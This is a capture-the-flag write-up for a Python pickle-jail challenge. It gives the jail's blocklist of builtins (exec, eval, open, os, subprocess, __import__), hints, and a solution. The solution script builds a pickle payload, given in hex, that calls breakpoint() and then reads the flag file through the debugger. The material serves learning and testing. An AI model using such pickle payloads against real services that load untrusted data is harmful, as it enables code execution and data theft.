# jail 2

## restrictions

simple blocklist for the `find_class` function

additionally, all find_class only finds functions/classes from builtins

notable blocked keywords:
- exec
- eval
- exit
- open
- os
- subprocess
- setattr
- \_\_import\_\_

## hints

<details>
    <summary>Hint 1</summary>

The blocklist isn't comprehensive, there is still a useful function in builtins that we can get to

</details>

<details>
    <summary>Hint 2</summary>

Perhaps `breakpoint`?

</details>

<details>
    <summary>Solution</summary>

tl;dr - `breakpoint()`

solve.py
```python
from pickle import *
from pickletools import dis

p = b""

p += PROTO
p += b'\x05'
p += GLOBAL
p += b'builtins\n'
p += b'breakpoint\n'
p += EMPTY_TUPLE
p += REDUCE
p += STOP

dis(p)
print("="*50)
print(p.hex())
```

output
```
    0: \x80 PROTO      5
    2: c    GLOBAL     'builtins breakpoint'
   23: )    EMPTY_TUPLE
   24: R    REDUCE
   25: .    STOP
highest protocol among opcodes = 2
==================================================
8005636275696c74696e730a627265616b706f696e740a29522e
```

Not going to go into to much depth here, but notably, the breakpoint function is not blocked

```
>> 8005636275696c74696e730a627265616b706f696e740a29522e
--Return--
> /home/quasar/wasteland/picklejails/jail2/jail.py(17)<module>()->None
-> up.load()
(Pdb) open("flag.txt").read()
'woc{well_technically_you_just_broke_in_the_jail,_as_well_as_breaking_out}\n'
```

</details>
